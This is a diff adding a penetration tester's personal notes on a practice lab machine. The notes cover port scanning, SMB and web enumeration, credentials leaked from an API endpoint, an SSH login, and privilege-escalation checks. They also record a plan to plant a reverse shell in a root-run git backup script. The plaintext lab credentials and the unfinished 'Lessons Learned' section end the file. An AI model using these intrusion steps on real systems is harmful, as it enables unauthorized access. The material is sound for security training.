@@ -1,0 +1,147 @@
+### Enumeration
+```
+IP=192.168.163.125
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p8080,43022,12445,18030 -A $IP
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 8080
+	- http-proxy
+	- nc -nv $IP 8080
+		- http-alt
+- 43022
+	- OpenSSH 8.4 (protocol 2.0)
+	- nc -nv $IP 43022
+		- SSH-2.0-OpenSSH_8.4
+- 12445
+	- Samba smbd 4.6.2
+	- nc -nv $IP 12445nc -nv $IP 12445
+		- unknown
+- 18030
+	- Apache httpd 2.4.46 ((Unix))
+	- nc -nv $IP 18030
+		- unknown
+### Foothold
+- 12445
+	- smbclient -N -L //$IP -p12445
+		- Login successful
+		- shares
+			- Commander
+			- IPC$
+	- nmap --script smb-vuln* -p12445 -Pn $IP
+		- Not running the scripts
+- 8080
+	- Default landing page
+		- ![[Pasted image 20240718101334.png]]
+		- ![[Pasted image 20240718101347.png]]
+	- Versions
+	- Directory Brute force
+		- dirsearch -u http://$IP:8080
+			- /api
+		- dirsearch -u http://$IP:8080/api
+			- /api/article
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+			- /api
+				- ![[Pasted image 20240718101726.png]]
+				- /api/article
+					- Same error page
+				- /api/
+					- ![[Pasted image 20240718101850.png]]
+				- /api/article/
+					- ![[Pasted image 20240718102116.png]]
+					- Username: password
+						- jvargas:OuQ96hcgiM5o9w
+						- jwinters:KTuGcSW6Zxwd0Q
+						- jsanchez:d52cQ1BzyNQycg
+						- rjackson:yYJcgYqszv4aGQ
+						- Checked through crackstation  -  not found
+						- base64 -d  invalid format
+						- hashid 'OuQ96hcgiM5o9w'
+							- unknown
+				- /api/user/
+					- ![[Pasted image 20240718102437.png]]
+					- Username:password
+						- rjackson:yYJcgYqszv4aGQ
+						- jsanchez:d52cQ1BzyNQycg
+						- dademola:ExplainSlowQuest110
+							- ssh dademola@192.168.163.125 -p 43022
+								- Successful
+						- jwinters:KTuGcSW6Zxwd0Q
+						- jvargas:OuQ96hcgiM5o9w
+	- Vulnerability scan
+		- nikto -h http://$IP
+- 18030
+	- Default landing page
+		- ![[Pasted image 20240718101321.png]]
+	- Versions
+	- Directory Brute force
+		- dirsearch -u http://$IP
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+	- Vulnerability scan
+		- nikto -h http://$IP
+### PE
+#### Linux
+- dademola
+	- id
+		- uid=1001(dademola) gid=1001(dademola) groups=1001(dademola)
+	- su root
+		- ExplainSlowQuest110  - failed
+	- sudo -l
+		- sudo: command not found
+	- uname -a
+		- Linux hunit 5.9.4-arch1-1 #1 SMP PREEMPT Wed, 04 Nov 2020 21:41:09 +0000 x86_64 GNU/Linux
+	- getcap -r / 2>/dev/null
+		- nothing
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- Users with console
+		- dademola
+		- git
+	- User directory
+		- .gradle
+		- .kotlin
+			- daemon
+				- empty
+		- blog.jar
+		- shared
+			- Alot of .kt files we have read over
+	- netstat -ano
+		- Active ports
+			- 8080 connects to alot of ports
+				- 192.168.45.195:33832
+	- /git-server
+		- move to user dir
+		- git clone file:///git-server/
+		- backups.sh
+			- placeholder bash script. Can probs input rev shell then push to master branch
+			- ![[Pasted image 20240718112523.png]]
+		- Setup git account
+			- ![[Pasted image 20240718112539.png]]
+		- Supposed to clone to attack box then push it with GIT_SSH_COMMAND
+	- linpeas
+		- wget does not work over 80, 8000, 21, 445, 9999
+		- port 12445 Works for file transfer
+		- Possible Exploits
+			- none
+		- Interesting Files
+			- Cron
+				- `*/2 * * * * /root/pull.sh`
+				- `*/3 * * * * /root/git-server/backups.sh`
+			- Ssh
+				- /home/git/.ssh/authorized_keys
+				- /home/git/.ssh/id_rsa.pub
+				- /home/git/.ssh/id_rsa
+					- ssh -i id_rsa root@localhost -p 43022
+						- needs password
+					- ssh -i id_rsa git@localhost -p 43022
+						- launches into git shell
+			- /etc/httpd/conf/httpd.conf
+		- samba running as root
+### Credentials
+- dademola:ExplainSlowQuest110
+### Lessons Learned
